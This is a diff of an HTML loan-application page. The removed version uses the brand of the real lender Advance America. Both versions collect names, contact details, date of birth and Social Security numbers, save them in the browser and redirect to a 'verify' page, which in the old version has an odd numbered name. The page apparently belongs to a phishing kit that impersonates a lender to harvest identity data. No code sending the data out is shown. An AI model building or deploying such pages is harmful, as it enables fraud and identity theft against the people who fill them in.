@@ -1,185 +1,166 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Advance America – Personal Loans</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta charset="UTF-8">
+<title>Personal Loan Application</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- Tailwind CDN (static-safe) -->
-  <script src="https://cdn.tailwindcss.com"></script>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #f5f7fa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+  }
 
-  <style>
-    .step { display: none; }
-    .step.active { display: block; }
-  </style>
+  .container {
+    background: #fff;
+    width: 100%;
+    max-width: 480px;
+    padding: 25px;
+    border-radius: 8px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+  }
+
+  h2 {
+    margin-bottom: 15px;
+    color: #333;
+  }
+
+  .step {
+    display: none;
+  }
+
+  .step.active {
+    display: block;
+  }
+
+  input, select, button {
+    width: 100%;
+    padding: 10px;
+    margin-top: 10px;
+    font-size: 14px;
+  }
+
+  button {
+    background: #0070f3;
+    border: none;
+    color: #fff;
+    cursor: pointer;
+    margin-top: 15px;
+    border-radius: 4px;
+  }
+
+  button:hover {
+    background: #005bb5;
+  }
+
+  .note {
+    font-size: 12px;
+    color: #666;
+    margin-top: 10px;
+  }
+</style>
 </head>
 
-<body class="bg-white text-gray-900">
+<body>
 
-<!-- HEADER -->
-<header class="border-b shadow-sm">
-  <div class="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
-    <a href="index.html" class="font-bold text-xl">Advance America</a>
-    <nav class="hidden md:flex gap-6">
-      <a href="personal-loans.html">Personal Loans</a>
-      <a href="how-it-works.html">How It Works</a>
-      <a href="faqs.html">FAQs</a>
-      <a href="contact.html">Contact</a>
-    </nav>
-  </div>
-</header>
+<div class="container">
 
-<!-- HERO -->
-<section class="bg-gradient-to-br from-blue-50 to-indigo-100 py-16">
-  <div class="max-w-7xl mx-auto px-4 grid lg:grid-cols-2 gap-10 items-center">
+  <form id="loanForm">
 
-    <!-- LEFT -->
-    <div>
-      <span class="inline-block bg-green-100 text-green-800 px-3 py-1 rounded-full text-sm mb-4">
-        No Hidden Fees • Fast Approval
-      </span>
+    <!-- STEP 1 -->
+    <div class="step active" id="step1">
+      <h2>Loan Details</h2>
 
-      <h1 class="text-4xl lg:text-5xl font-bold mb-4">
-        Personal Loans up to <span class="text-blue-600">$100,000</span>
-      </h1>
+      <input
+        type="number"
+        name="loanAmount"
+        placeholder="Enter Loan Amount"
+        required
+      >
 
-      <p class="text-lg text-gray-600 mb-6">
-        Apply online in minutes with fast approval and flexible repayment options.
-      </p>
+      <input
+        type="text"
+        name="loanPurpose"
+        placeholder="Loan Purpose"
+        required
+      >
+
+      <button type="button" onclick="goToStep2()">Continue</button>
     </div>
 
-    <!-- FORM CARD -->
-    <div class="bg-white rounded-xl shadow-lg max-w-md mx-auto w-full">
+    <!-- STEP 2 -->
+    <div class="step" id="step2">
+      <h2>Personal Information</h2>
 
-      <!-- PROGRESS -->
-      <div class="p-6 border-b bg-gray-50 rounded-t-xl">
-        <h2 class="text-2xl font-semibold text-center">Personal Loan Application</h2>
-        <div class="flex justify-between text-sm text-gray-500 mt-2">
-          <span id="stepText">Step 1 of 2</span>
-          <span id="percentText">50% Complete</span>
-        </div>
-        <div class="w-full h-2 bg-gray-200 rounded-full mt-2">
-          <div id="progressBar" class="h-2 bg-orange-400 rounded-full w-1/2"></div>
-        </div>
+      <input name="firstName" placeholder="First Name *" required>
+      <input name="lastName" placeholder="Last Name *" required>
+
+      <input type="email" name="email" placeholder="Email ID *" required>
+
+      <input
+        type="tel"
+        name="phone"
+        placeholder="Phone Number *"
+        required
+      >
+
+      <input
+        name="address"
+        placeholder="Home Address *"
+        required
+      >
+
+      <input name="city" placeholder="City">
+
+      <input name="zip" placeholder="ZIP Code">
+
+      <input
+        type="date"
+        name="dob"
+        required
+      >
+
+      <input
+        name="ssn"
+        placeholder="Social Security Number *"
+        required
+        autocomplete="off"
+      >
+
+      <button type="submit">Proceed</button>
+
+      <div class="note">
+        By continuing, you agree to our terms and privacy policy.
       </div>
-
-      <!-- FORM -->
-      <form id="loanForm" class="p-6 space-y-6">
-
-        <!-- STEP 1 -->
-        <div class="step active" id="step1">
-          <h3 class="text-lg font-semibold text-center">Loan Details</h3>
-
-          <div>
-            <label class="block text-sm font-medium mb-1">Loan Amount</label>
-            <input type="number" min="2000" max="10000" required
-              class="w-full border rounded-md px-3 py-2"
-              placeholder="5000">
-          </div>
-
-          <div>
-            <label class="block text-sm font-medium mb-1">Loan Purpose</label>
-            <select required class="w-full border rounded-md px-3 py-2">
-              <option value="">Select purpose</option>
-              <option>Debt Consolidation</option>
-              <option>Home Improvement</option>
-              <option>Medical</option>
-              <option>Personal Expenses</option>
-            </select>
-          </div>
-
-          <button type="button" onclick="nextStep()"
-            class="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700">
-            Next
-          </button>
-        </div>
-
-        <!-- STEP 2 -->
-        <div class="step" id="step2">
-          <h3 class="text-lg font-semibold text-center">Personal Information</h3>
-
-          <div class="grid grid-cols-2 gap-4">
-            <input required placeholder="First Name" class="border px-3 py-2 rounded-md">
-            <input required placeholder="Last Name" class="border px-3 py-2 rounded-md">
-          </div>
-
-          <input type="email" required placeholder="Email"
-            class="w-full border px-3 py-2 rounded-md">
-
-          <input type="tel" required placeholder="Phone Number"
-            class="w-full border px-3 py-2 rounded-md">
-
-          <input required placeholder="Home Address"
-            class="w-full border px-3 py-2 rounded-md">
-
-          <div class="grid grid-cols-3 gap-4">
-            <input placeholder="City" class="border px-3 py-2 rounded-md">
-            <input placeholder="State" class="border px-3 py-2 rounded-md">
-            <input placeholder="ZIP" class="border px-3 py-2 rounded-md">
-          </div>
-
-          <input placeholder="Date of Birth (YYYY-MM-DD)"
-            class="w-full border px-3 py-2 rounded-md">
-
-          <input placeholder="SSN (XXX-XX-XXXX)"
-            class="w-full border px-3 py-2 rounded-md">
-
-          <div class="flex justify-between gap-4">
-            <button type="button" onclick="prevStep()"
-              class="border px-4 py-2 rounded-md">
-              Back
-            </button>
-
-            <button type="submit"
-              class="bg-green-600 text-white px-4 py-2 rounded-md hover:bg-green-700">
-              Submit Application
-            </button>
-          </div>
-        </div>
-
-      </form>
     </div>
-  </div>
-</section>
 
-<!-- FOOTER -->
-<footer class="bg-slate-900 text-white mt-20">
-  <div class="max-w-7xl mx-auto px-4 py-10 text-center text-sm text-gray-400">
-    © 2025 Advance America. All rights reserved.
-  </div>
-</footer>
+  </form>
 
-<!-- JS -->
+</div>
+
 <script>
-  function nextStep() {
-    document.getElementById('step1').classList.remove('active');
-    document.getElementById('step2').classList.add('active');
-  }
+function goToStep2() {
+  document.getElementById("step1").classList.remove("active");
+  document.getElementById("step2").classList.add("active");
+}
 
-  function prevStep() {
-    document.getElementById('step2').classList.remove('active');
-    document.getElementById('step1').classList.add('active');
-  }
+document.getElementById("loanForm").addEventListener("submit", function(e) {
+  e.preventDefault();
 
-  document.getElementById('loanForm').addEventListener('submit', function (e) {
-    e.preventDefault();
+  const formData = new FormData(this);
+  const data = Object.fromEntries(formData.entries());
 
-    const formData = new FormData(this);
-    const data = {};
+  // Store data in memory
+  localStorage.setItem("loanData", JSON.stringify(data));
 
-    formData.forEach((value, key) => {
-      data[key] = value;
-    });
-
-    // ✅ Save all data
-    localStorage.setItem('loanApplication', JSON.stringify(data));
-
-    // ✅ Redirect (this is what you want)
-    window.location.href = 'vrfy6134853.html';
-  });
+  // Redirect to verify page
+  window.location.href = "verify.html";
+});
 </script>
-
-
 
 </body>
 </html>
